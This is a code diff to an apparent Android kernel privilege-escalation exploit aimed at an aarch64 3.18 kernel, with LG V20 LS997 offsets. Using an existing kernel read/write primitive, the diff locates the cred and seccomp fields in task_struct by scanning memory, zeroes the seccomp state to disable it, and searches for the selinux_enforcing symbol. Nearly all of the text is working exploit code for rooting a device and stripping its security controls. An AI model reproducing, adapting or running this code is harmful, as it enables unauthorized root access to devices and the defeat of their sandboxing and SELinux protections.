@@ -13,14 +13,18 @@
 // Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
 #define OFFSET__thread_info__flags 0x000
 #define OFFSET__task_struct__stack 0x008
-#define OFFSET__task_struct__cred 0x550
-#define OFFSET__task_struct__seccomp 0x9b0 
 #define OFFSET__cred__uid 0x004
 #define OFFSET__cred__securebits 0x024
 #define OFFSET__cred__cap_permitted 0x030
-#define OFFSET__cred__user_ns 0x088 // if you undefine this, it might still work
 #define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted+0x008)
 #define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)
+
+// The following are for LGV20 LS997
+//#define OFFSET__task_struct__seccomp 0x9b0 
+//#define OFFSET__cred__user_ns 0x088 // if you define this, the first run might be a little faster
+//#define OFFSET__task_struct__cred 0x550
+
+
 //Note needed, but saved for future use
 //#define OFFSET__cred__security 0x078
 //#define OFFSET__cred__cap_inheritable 0x028
@@ -617,7 +621,7 @@ int verifyCred(unsigned long cred_ptr) {
     return uid == getuid();
 }
 
-int getCredOffset(unsigned long task_struct_ptr, char* execName) {
+int getCredOffset(unsigned char* task_struct_data, char* execName) {
     char taskname[16];
     char* p = strrchr(execName, '/');
     if (p == NULL)
@@ -628,8 +632,6 @@ int getCredOffset(unsigned long task_struct_ptr, char* execName) {
     memcpy(taskname, p, n);
     p[15] = 0; 
     
-    unsigned char task_struct_data[PAGE+16];
-    kernel_read(task_struct_ptr, task_struct_data, PAGE);
     for (int i=OFFSET__task_struct__stack+8; i<PAGE-16; i+=8) 
         if (0 == memcmp(task_struct_data+i, p, n) && verifyCred(*(unsigned long*)(task_struct_data+i-8)))
             return i-8;
@@ -637,6 +639,34 @@ int getCredOffset(unsigned long task_struct_ptr, char* execName) {
     errno=0;
     error("Cannot find cred structure");
     return -1;
+}
+
+int getSeccompOffset(unsigned char* task_struct_data, unsigned credOffset, unsigned seccompStatus) {
+    if (seccompStatus != 2)
+        return -1;
+    
+    unsigned long firstGuess = -1;
+    
+    for (int i=credOffset&~7; i<PAGE-24; i+=8) {
+        struct {
+            unsigned long seccomp_status;
+            unsigned long seccomp_filter;
+            unsigned int parent_exe;
+            unsigned int child_exe;
+        } *p = (void*)(task_struct_data+i);
+        
+        if (p->seccomp_status == seccompStatus && ((p->seccomp_filter & 0xFFFFFFFF00000000ul) == 0xFFFFFFC000000000ul)) {
+            if (p->child_exe == p->parent_exe + 1) {
+                return i;
+            }
+            else {
+                if (firstGuess < 0)
+                    firstGuess = i;
+            }
+        }
+    }
+    
+    return firstGuess;
 }
 
 int main(int argc, char **argv)
@@ -669,8 +699,10 @@ int main(int argc, char **argv)
     message("MAIN: should have stable kernel R/W now");
 
     message("MAIN: searching for cred offset in task_struct");
+    unsigned char task_struct_data[PAGE+16];
+    kernel_read(task_struct_ptr, task_struct_data, PAGE);
         
-    unsigned long offset_task_struct__cred = getCredOffset(task_struct_ptr, argv[0]);
+    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data, argv[0]);
     
     unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
 
@@ -702,24 +734,29 @@ int main(int argc, char **argv)
         message("MAIN: disabling SECCOMP");
         kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
         // TODO: search for seccomp offset
-        kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp, 0);
-        kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp + 8, 0);
-        message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
+        int offset__task_struct__seccomp = getSeccompOffset(task_struct_data, offset_task_struct__cred, seccompStatus);
+        if (offset__task_struct__seccomp < 0) 
+            message("MAIN: **FAIL** cannot find seccomp offset");
+        else {
+            message("MAIN: seccomp offset %lx", offset__task_struct__seccomp);
+            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp, 0);
+            kernel_write_ulong(task_struct_ptr + offset__task_struct__seccomp + 8, 0);
+            message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
+        }
     }
 
 #ifdef OFFSET__cred__user_ns    
-    unsigned long user_ns = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
-    if (user_ns < 0xffffffc000000000ul || user_ns >= 0xffffffd000000000ul)
-        user_ns = 0xffffffc001744b70ul;
+    unsigned long search_base = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
+    if (search_base < 0xffffffc000000000ul || search_base >= 0xffffffd000000000ul)
+        search_base = 0xffffffc001744b70ul;
 #else
-    unsigned long user_ns = 0xffffffc001744b70ul;
+#define search_base 0xffffffc000000000ul
 #endif
-    user_ns = 0xffffffc000000000ul;
 
-    message("MAIN: user_ns = %lx", user_ns);
+    message("MAIN: search_base = %lx", search_base);
 
     message("MAIN: searching for selinux_enforcing");
-    unsigned long selinux_enforcing = findSymbol(user_ns, "selinux_enforcing");
+    unsigned long selinux_enforcing = findSymbol(search_base, "selinux_enforcing");
     if (selinux_enforcing == 0)
         message("MAIN: **FAIL** cannot find selinux_enforcing symbol");
     else
